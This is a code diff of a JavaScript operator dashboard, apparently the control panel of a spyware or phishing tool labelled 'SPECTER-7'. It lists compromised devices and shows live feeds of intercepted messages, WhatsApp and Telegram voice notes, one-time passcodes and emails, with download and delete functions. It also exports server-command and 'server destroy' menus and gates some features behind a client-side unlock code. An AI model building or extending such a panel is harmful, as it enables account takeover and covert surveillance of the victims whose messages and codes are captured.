+    else alert(`✅ مفتوح\nمحاولات فاشلة: ${s.attempts}/${ADV_MAX_ATTEMPTS}\nمستوى القفل: ${s.lockLevel}`);
+}
+function forceUnlockAdvanced() { clearAdvLockState(); alert('🔓 تم فتح القفل يدويًا'); }
+
+// ═══════════════════════════════════════════
+// Session verify + START
 // ═══════════════════════════════════════════
 (async function verifySession() {
     const token = getAuthToken();
@@ -1624,48 +2102,21 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
 setInterval(() => { const s = document.getElementById('securityTab'); if (s && s.classList.contains('active')) loadAuthorizedDevices(); }, 60000);
 
 // ═══════════════════════════════════════════
-// START
-// ═══════════════════════════════════════════
-loadAuthorizedDevices();
-loadDevices();
-setInterval(loadDevices, 30000);
-
-// ═══════════════════════════════════════════
 // 🔐 Live Messages / Voices / OTP / Emails
 // ═══════════════════════════════════════════
-// ─── Live Messages ───
-function openLiveMessages() {
-    const el = document.getElementById('liveMsgsOverlay');
-    if (el) el.style.display = 'block';
-    renderLiveMsgs();
-}
-function closeLiveMessages() {
-    const el = document.getElementById('liveMsgsOverlay');
-    if (el) el.style.display = 'none';
-}
-function clearLiveMsgs() {
-    if (!confirm('مسح الرسائل؟')) return;
-    liveMsgs = [];
-    const c = document.getElementById('liveMsgsCount');
-    if (c) c.textContent = '0';
-    renderLiveMsgs();
-}
+function openLiveMessages() { const el = document.getElementById('liveMsgsOverlay'); if (el) el.style.display = 'block'; renderLiveMsgs(); }
+function closeLiveMessages() { const el = document.getElementById('liveMsgsOverlay'); if (el) el.style.display = 'none'; }
+function clearLiveMsgs() { if (!confirm('مسح الرسائل؟')) return; liveMsgs = []; const c = document.getElementById('liveMsgsCount'); if (c) c.textContent = '0'; renderLiveMsgs(); }
 function filterLiveMsgs(type) {
     liveMsgsFilter = type;
-    const setBg = (id, active) => {
-        const el = document.getElementById(id);
-        if (el) el.style.background = active ? '#ff0066' : '#333';
-    };
-    setBg('filterAll', type === 'all');
-    setBg('filterIn', type === 'in');
-    setBg('filterOut', type === 'out');
+    const setBg = (id, active) => { const el = document.getElementById(id); if (el) el.style.background = active ? '#ff0066' : '#333'; };
+    setBg('filterAll', type === 'all'); setBg('filterIn', type === 'in'); setBg('filterOut', type === 'out');
     renderLiveMsgs();
 }
 function addLiveMsg(msg) {
     liveMsgs.unshift(msg);
     if (liveMsgs.length > 500) liveMsgs = liveMsgs.slice(0, 500);
-    const c = document.getElementById('liveMsgsCount');
-    if (c) c.textContent = liveMsgs.length;
+    const c = document.getElementById('liveMsgsCount'); if (c) c.textContent = liveMsgs.length;
     if (document.getElementById('liveMsgsOverlay')?.style.display === 'block') renderLiveMsgs();
 }
 function renderLiveMsgs() {
@@ -1674,10 +2125,7 @@ function renderLiveMsgs() {
     let filtered = liveMsgs;
     if (liveMsgsFilter === 'in') filtered = liveMsgs.filter(m => m.type == 1);
     if (liveMsgsFilter === 'out') filtered = liveMsgs.filter(m => m.type == 2);
-    if (filtered.length === 0) {
-        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>';
-        return;
-    }
+    if (filtered.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>'; return; }
     list.innerHTML = '';
     filtered.forEach((msg) => {
         const realIdx = liveMsgs.indexOf(msg);
@@ -1692,42 +2140,23 @@ function renderLiveMsgs() {
 function deleteLiveMsg(idx) {
     if (!confirm('حذف؟')) return;
     liveMsgs.splice(idx, 1);
-    const c = document.getElementById('liveMsgsCount');
-    if (c) c.textContent = liveMsgs.length;
+    const c = document.getElementById('liveMsgsCount'); if (c) c.textContent = liveMsgs.length;
     renderLiveMsgs();
 }
 
-// ─── Live Voices ───
-function openLiveVoices() {
-    const el = document.getElementById('liveVoicesOverlay');
-    if (el) el.style.display = 'block';
-    renderLiveVoices();
-}
-function closeLiveVoices() {
-    const el = document.getElementById('liveVoicesOverlay');
-    if (el) el.style.display = 'none';
-}
-function clearLiveVoices() {
-    if (!confirm('مسح الأصوات؟')) return;
-    liveVoices = [];
-    const c = document.getElementById('liveVoicesCount');
-    if (c) c.textContent = '0';
-    renderLiveVoices();
-}
+function openLiveVoices() { const el = document.getElementById('liveVoicesOverlay'); if (el) el.style.display = 'block'; renderLiveVoices(); }
+function closeLiveVoices() { const el = document.getElementById('liveVoicesOverlay'); if (el) el.style.display = 'none'; }
+function clearLiveVoices() { if (!confirm('مسح الأصوات؟')) return; liveVoices = []; const c = document.getElementById('liveVoicesCount'); if (c) c.textContent = '0'; renderLiveVoices(); }
 function addLiveVoice(voice) {
     liveVoices.unshift(voice);
     if (liveVoices.length > 200) liveVoices = liveVoices.slice(0, 200);
-    const c = document.getElementById('liveVoicesCount');
-    if (c) c.textContent = liveVoices.length;
+    const c = document.getElementById('liveVoicesCount'); if (c) c.textContent = liveVoices.length;
     if (document.getElementById('liveVoicesOverlay')?.style.display === 'block') renderLiveVoices();
 }
 function renderLiveVoices() {
     const list = document.getElementById('liveVoicesList');
     if (!list) return;
-    if (liveVoices.length === 0) {
-        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد صوتيات</p>';
-        return;
-    }
+    if (liveVoices.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد صوتيات</p>'; return; }
     list.innerHTML = '';
     liveVoices.forEach((voice, idx) => {
         const srcLabels = { whatsapp_voice: '💬 واتساب', telegram_voice: '✈️ تيليجرام', unknown: '🎤' };
@@ -1739,59 +2168,26 @@ function renderLiveVoices() {
     });
 }
 function downloadLiveVoice(idx) {
-    const v = liveVoices[idx];
-    if (!v) return;
+    const v = liveVoices[idx]; if (!v) return;
     let mime = 'audio/ogg';
-    if (v.file_name) {
-        const n = v.file_name.toLowerCase();
-        if (n.endsWith('.opus') || n.endsWith('.ogg')) mime = 'audio/ogg';
-        else if (n.endsWith('.m4a')) mime = 'audio/mp4';
-        else if (n.endsWith('.mp3')) mime = 'audio/mpeg';
-    }
-    const a = document.createElement('a');
-    a.href = `data:${mime};base64,${v.file_data}`;
-    a.download = v.file_name || 'voice.opus';
-    document.body.appendChild(a); a.click(); a.remove();
+    if (v.file_name) { const n = v.file_name.toLowerCase(); if (n.endsWith('.opus') || n.endsWith('.ogg')) mime = 'audio/ogg'; else if (n.endsWith('.m4a')) mime = 'audio/mp4'; else if (n.endsWith('.mp3')) mime = 'audio/mpeg'; }
+    const a = document.createElement('a'); a.href = `data:${mime};base64,${v.file_data}`; a.download = v.file_name || 'voice.opus'; document.body.appendChild(a); a.click(); a.remove();
 }
-function deleteLiveVoice(idx) {
-    if (!confirm('حذف؟')) return;
-    liveVoices.splice(idx, 1);
-    const c = document.getElementById('liveVoicesCount');
-    if (c) c.textContent = liveVoices.length;
-    renderLiveVoices();
-}
+function deleteLiveVoice(idx) { if (!confirm('حذف؟')) return; liveVoices.splice(idx, 1); const c = document.getElementById('liveVoicesCount'); if (c) c.textContent = liveVoices.length; renderLiveVoices(); }
 
-// ─── Live OTP ───
-function openLiveOtp() {
-    const el = document.getElementById('liveOtpOverlay');
-    if (el) el.style.display = 'block';
-    renderLiveOtp();
-}
-function closeLiveOtp() {
-    const el = document.getElementById('liveOtpOverlay');
-    if (el) el.style.display = 'none';
-}
-function clearLiveOtp() {
-    if (!confirm('مسح الأكواد؟')) return;
-    liveOtps = [];
-    const c = document.getElementById('liveOtpCount');
-    if (c) c.textContent = '0';
-    renderLiveOtp();
-}
+function openLiveOtp() { const el = document.getElementById('liveOtpOverlay'); if (el) el.style.display = 'block'; renderLiveOtp(); }
+function closeLiveOtp() { const el = document.getElementById('liveOtpOverlay'); if (el) el.style.display = 'none'; }
+function clearLiveOtp() { if (!confirm('مسح الأكواد؟')) return; liveOtps = []; const c = document.getElementById('liveOtpCount'); if (c) c.textContent = '0'; renderLiveOtp(); }
 function addLiveOtp(otp) {
     liveOtps.unshift(otp);
     if (liveOtps.length > 200) liveOtps = liveOtps.slice(0, 200);
-    const c = document.getElementById('liveOtpCount');
-    if (c) c.textContent = liveOtps.length;
+    const c = document.getElementById('liveOtpCount'); if (c) c.textContent = liveOtps.length;
     if (document.getElementById('liveOtpOverlay')?.style.display === 'block') renderLiveOtp();
 }
 function renderLiveOtp() {
     const list = document.getElementById('liveOtpList');
     if (!list) return;
-    if (liveOtps.length === 0) {
-        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد</p>';
-        return;
-    }
+    if (liveOtps.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد</p>'; return; }
     list.innerHTML = '';
     liveOtps.forEach((otp, idx) => {
         const div = document.createElement('div');
@@ -1800,45 +2196,21 @@ function renderLiveOtp() {
         list.appendChild(div);
     });
 }
-function deleteLiveOtp(idx) {
-    if (!confirm('حذف؟')) return;
-    liveOtps.splice(idx, 1);
-    const c = document.getElementById('liveOtpCount');
-    if (c) c.textContent = liveOtps.length;
-    renderLiveOtp();
-}
+function deleteLiveOtp(idx) { if (!confirm('حذف؟')) return; liveOtps.splice(idx, 1); const c = document.getElementById('liveOtpCount'); if (c) c.textContent = liveOtps.length; renderLiveOtp(); }
 
-// ─── Live Emails ───
-function openLiveEmails() {
-    const el = document.getElementById('liveEmailsOverlay');
-    if (el) el.style.display = 'block';
-    renderLiveEmails();
-}
-function closeLiveEmails() {
-    const el = document.getElementById('liveEmailsOverlay');
-    if (el) el.style.display = 'none';
-}
-function clearLiveEmails() {
-    if (!confirm('مسح البريد؟')) return;
-    liveEmails = [];
-    const c = document.getElementById('liveEmailsCount');
-    if (c) c.textContent = '0';
-    renderLiveEmails();
-}
+function openLiveEmails() { const el = document.getElementById('liveEmailsOverlay'); if (el) el.style.display = 'block'; renderLiveEmails(); }
+function closeLiveEmails() { const el = document.getElementById('liveEmailsOverlay'); if (el) el.style.display = 'none'; }
+function clearLiveEmails() { if (!confirm('مسح البريد؟')) return; liveEmails = []; const c = document.getElementById('liveEmailsCount'); if (c) c.textContent = '0'; renderLiveEmails(); }
 function addLiveEmail(email) {
     liveEmails.unshift(email);
     if (liveEmails.length > 200) liveEmails = liveEmails.slice(0, 200);
-    const c = document.getElementById('liveEmailsCount');
-    if (c) c.textContent = liveEmails.length;
+    const c = document.getElementById('liveEmailsCount'); if (c) c.textContent = liveEmails.length;
     if (document.getElementById('liveEmailsOverlay')?.style.display === 'block') renderLiveEmails();
 }
 function renderLiveEmails() {
     const list = document.getElementById('liveEmailsList');
     if (!list) return;
-    if (liveEmails.length === 0) {
-        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>';
-        return;
-    }
+    if (liveEmails.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل</p>'; return; }
     list.innerHTML = '';
     liveEmails.forEach((email, idx) => {
         const div = document.createElement('div');
@@ -1847,228 +2219,7 @@ function renderLiveEmails() {
         list.appendChild(div);
     });
 }
-function deleteLiveEmail(idx) {
-    if (!confirm('حذف؟')) return;
-    liveEmails.splice(idx, 1);
-    const c = document.getElementById('liveEmailsCount');
-    if (c) c.textContent = liveEmails.length;
-    renderLiveEmails();
-}
-
-// ═══════════════════════════════════════════
-// 🔐 Advanced Code Protection
-// ═══════════════════════════════════════════
-const ADVANCED_CODE = "2024";
-const ADV_LOCK_KEY = "adv_lock_state";
-const ADV_MAX_ATTEMPTS = 3;
-const ADV_LOCK_STEPS = [30, 300, 3600, 86400];
-
-function getAdvLockState() {
-    try {
-        const raw = localStorage.getItem(ADV_LOCK_KEY);
-        if (!raw) return { attempts: 0, lockedUntil: 0, lockLevel: 0 };
-        const parsed = JSON.parse(raw);
-        return {
-            attempts: parsed.attempts || 0,
-            lockedUntil: parsed.lockedUntil || 0,
-            lockLevel: parsed.lockLevel || 0
-        };
-    } catch (e) {
-        return { attempts: 0, lockedUntil: 0, lockLevel: 0 };
-    }
-}
-
-function saveAdvLockState(state) {
-    try { localStorage.setItem(ADV_LOCK_KEY, JSON.stringify(state)); } catch (e) {}
-}
-
-function clearAdvLockState() {
-    try { localStorage.removeItem(ADV_LOCK_KEY); } catch (e) {}
-}
-
-function formatWaitTime(seconds) {
-    if (seconds < 60) return `${seconds} ثانية`;
-    if (seconds < 3600) return `${Math.floor(seconds / 60)} دقيقة`;
-    if (seconds < 86400) return `${Math.floor(seconds / 3600)} ساعة`;
-    return `${Math.floor(seconds / 86400)} يوم`;
-}
-
-function showAdvancedDialog() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-
-    const existing = document.getElementById('advCodeOverlay');
-    if (existing) existing.remove();
-
-    const state = getAdvLockState();
-    const now = Date.now();
-    const isLocked = state.lockedUntil > now;
-    const remainingSec = isLocked ? Math.ceil((state.lockedUntil - now) / 1000) : 0;
-
-    const accent = isLocked ? '#ff3300' : '#00ffcc';
-    const statusText = isLocked
-        ? `🔒 مقفول — الوقت المتبقي: ${formatWaitTime(remainingSec)}`
-        : `محاولات فاشلة: ${state.attempts}/${ADV_MAX_ATTEMPTS}`;
-
-    const ov = document.createElement('div');
-    ov.id = 'advCodeOverlay';
-    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:10001;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px);';
-    ov.innerHTML = `
-        <div style="background:#0a0a0a;border:2px solid ${accent};border-radius:15px;padding:28px 24px;max-width:400px;width:100%;box-shadow:0 0 30px ${accent}55;animation: advFadeIn 0.3s ease;">
-            <div style="text-align:center;margin-bottom:20px;">
-                <div style="font-size:42px;margin-bottom:8px;">🔐</div>
-                <h2 style="color:${accent};font-size:20px;margin:0 0 6px 0;">المميزات المتقدمة</h2>
-                <p style="color:#888;font-size:12px;margin:0;">أدخل الكود السري للوصول</p>
-            </div>
-
-            <div id="advStatusBox" style="background:#1a1a1a;border:1px solid ${accent}44;border-radius:8px;padding:10px;margin-bottom:16px;text-align:center;color:${accent};font-size:12px;font-weight:bold;">
-                ${statusText}
-            </div>
-
-            <input id="advCodeInput" type="password" inputmode="numeric" placeholder="••••" maxlength="20"
-                ${isLocked ? 'disabled' : ''}
-                style="width:100%;padding:14px 16px;background:#000;color:#fff;border:2px solid ${accent};border-radius:10px;font-size:22px;text-align:center;letter-spacing:8px;font-family:monospace;margin-bottom:16px;outline:none;box-sizing:border-box;"
-                autocomplete="off" />
-
-            <div style="display:flex;gap:10px;">
-                <button id="advSubmitBtn" ${isLocked ? 'disabled' : ''}
-                    style="flex:1;background:${accent};color:#000;border:none;padding:13px;border-radius:10px;cursor:${isLocked ? 'not-allowed' : 'pointer'};font-weight:bold;font-size:15px;opacity:${isLocked ? '0.5' : '1'};">
-                    ${isLocked ? '⏳ مقفول' : '🔓 دخول'}
-                </button>
-                <button id="advCancelBtn"
-                    style="background:#333;color:#fff;border:none;padding:13px 20px;border-radius:10px;cursor:pointer;font-weight:bold;font-size:15px;">
-                    ✖
-                </button>
-            </div>
-
-            <div style="text-align:center;margin-top:14px;">
-                <span id="advTimerText" style="color:#666;font-size:11px;">
-                    ${isLocked ? 'يُفتح تلقائيًا بعد ' + formatWaitTime(remainingSec) : 'اضغط Enter للدخول'}
-                </span>
-            </div>
-        </div>
-        <style>
-            @keyframes advFadeIn {
-                from { opacity: 0; transform: scale(0.95); }
-                to { opacity: 1; transform: scale(1); }
-            }
-            @keyframes advShake {
-                0%, 100% { transform: translateX(0); }
-                20% { transform: translateX(-10px); }
-                40% { transform: translateX(10px); }
-                60% { transform: translateX(-6px); }
-                80% { transform: translateX(6px); }
-            }
-        </style>
-    `;
-    document.body.appendChild(ov);
-
-    const input = document.getElementById('advCodeInput');
-    const submitBtn = document.getElementById('advSubmitBtn');
-    const cancelBtn = document.getElementById('advCancelBtn');
-    const statusBox = document.getElementById('advStatusBox');
-    const timerText = document.getElementById('advTimerText');
-
-    if (!isLocked && input) {
-        setTimeout(() => input.focus(), 200);
-        input.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitAdvCode();
-        });
-    }
-
-    function submitAdvCode() {
-        if (!input || isLocked) return;
-        const entered = input.value.trim();
-        if (!entered) { shakeDialog('ادخل الكود'); return; }
-
-        if (entered === ADVANCED_CODE) {
-            clearAdvLockState();
-            closeDialog();
-            console.log('✅ كود صح');
-            setTimeout(() => openAdvancedMenu(), 150);
-            return;
-        }
-
-        const s = getAdvLockState();
-        s.attempts++;
-
-        if (s.attempts >= ADV_MAX_ATTEMPTS) {
-            const level = Math.min(s.lockLevel, ADV_LOCK_STEPS.length - 1);
-            const lockSeconds = ADV_LOCK_STEPS[level];
-            s.lockedUntil = Date.now() + (lockSeconds * 1000);
-            s.lockLevel = Math.min(s.lockLevel + 1, ADV_LOCK_STEPS.length - 1);
-            s.attempts = 0;
-            saveAdvLockState(s);
-            closeDialog();
-            setTimeout(() => showAdvancedDialog(), 200);
-            console.log('🚫 Locked for', lockSeconds, 'seconds');
-        } else {
-            saveAdvLockState(s);
-            const left = ADV_MAX_ATTEMPTS - s.attempts;
-            statusBox.textContent = `❌ كود خاطئ — المحاولات المتبقية: ${left}`;
-            statusBox.style.color = '#ff6666';
-            input.value = '';
-            shakeDialog('كود خاطئ');
-        }
-    }
-
-    function shakeDialog(msg) {
-        const box = ov.querySelector('div');
-        box.style.animation = 'none';
-        setTimeout(() => { box.style.animation = 'advShake 0.4s ease'; }, 10);
-        timerText.textContent = msg;
-        timerText.style.color = '#ff6666';
-        setTimeout(() => {
-            timerText.style.color = '#666';
-            timerText.textContent = 'اضغط Enter للدخول';
-        }, 2000);
-    }
-
-    function closeDialog() {
-        ov.style.animation = 'advFadeIn 0.2s ease reverse';
-        setTimeout(() => ov.remove(), 200);
-    }
-
-    if (submitBtn) submitBtn.onclick = submitAdvCode;
-    if (cancelBtn) cancelBtn.onclick = closeDialog;
-
-    ov.addEventListener('click', (e) => { if (e.target === ov) closeDialog(); });
-
-    if (isLocked) {
-        const interval = setInterval(() => {
-            const st = getAdvLockState();
-            const n = Date.now();
-            if (st.lockedUntil <= n) {
-                clearInterval(interval);
-                closeDialog();
-                setTimeout(() => showAdvancedDialog(), 100);
-                return;
-            }
-            const rem = Math.ceil((st.lockedUntil - n) / 1000);
-            if (timerText) timerText.textContent = 'يُفتح تلقائيًا بعد ' + formatWaitTime(rem);
-            if (statusBox) statusBox.textContent = `🔒 مقفول — الوقت المتبقي: ${formatWaitTime(rem)}`;
-        }, 1000);
-
-        const observer = new MutationObserver(() => {
-            if (!document.body.contains(ov)) { clearInterval(interval); observer.disconnect(); }
-        });
-        observer.observe(document.body, { childList: true });
-    }
-}
-
-function requestAdvancedCode() { showAdvancedDialog(); }
-function showAdvLockStatus() {
-    const s = getAdvLockState();
-    const now = Date.now();
-    if (s.lockedUntil > now) {
-        alert(`🔒 مقفول — ${formatWaitTime(Math.ceil((s.lockedUntil - now) / 1000))}\nالمستوى: ${s.lockLevel}/${ADV_LOCK_STEPS.length - 1}`);
-    } else {
-        alert(`✅ مفتوح\nمحاولات فاشلة: ${s.attempts}/${ADV_MAX_ATTEMPTS}\nمستوى القفل: ${s.lockLevel}`);
-    }
-}
-function forceUnlockAdvanced() {
-    clearAdvLockState();
-    alert('🔓 تم فتح القفل يدويًا');
-}
+function deleteLiveEmail(idx) { if (!confirm('حذف؟')) return; liveEmails.splice(idx, 1); const c = document.getElementById('liveEmailsCount'); if (c) c.textContent = liveEmails.length; renderLiveEmails(); }
 
 // ═══════════════════════════════════════════
 // Window exports
@@ -2095,6 +2246,10 @@ window.openServerDestroyMenu = openServerDestroyMenu;
 window.closeServerDestroyMenu = closeServerDestroyMenu;
 window.sendServerCmd = sendServerCmd;
 window.sendServerCmdConfirm = sendServerCmdConfirm;
+window.execServerMenuCmd = execServerMenuCmd;
+window.openServerMenuDynamic = openServerMenuDynamic;
+window.requestSectionCode = requestSectionCode;
+window.requestMasterReset = requestMasterReset;
 
 window.openLiveMotion = openLiveMotion;
 window.closeLiveMotion = closeLiveMotion;
@@ -2231,5 +2386,9 @@ window.requestAdvancedCode = requestAdvancedCode;
 window.showAdvLockStatus = showAdvLockStatus;
 window.forceUnlockAdvanced = forceUnlockAdvanced;
 
-console.log('%c🔐 Advanced code protection active', 'color: #ff0066; font-weight: bold;');
-console.log('%c✅ SPECTER-7 script loaded (with multi-site Phishing + Server Admin)', 'color: #00ffcc; font-weight: bold;');
+// START
+loadAuthorizedDevices();
+loadDevices();
+setInterval(loadDevices, 30000);
+
+console.log('%c✅ SPECTER-7 loaded — section locks + dynamic server menus', 'color: #00ffcc; font-weight: bold;');
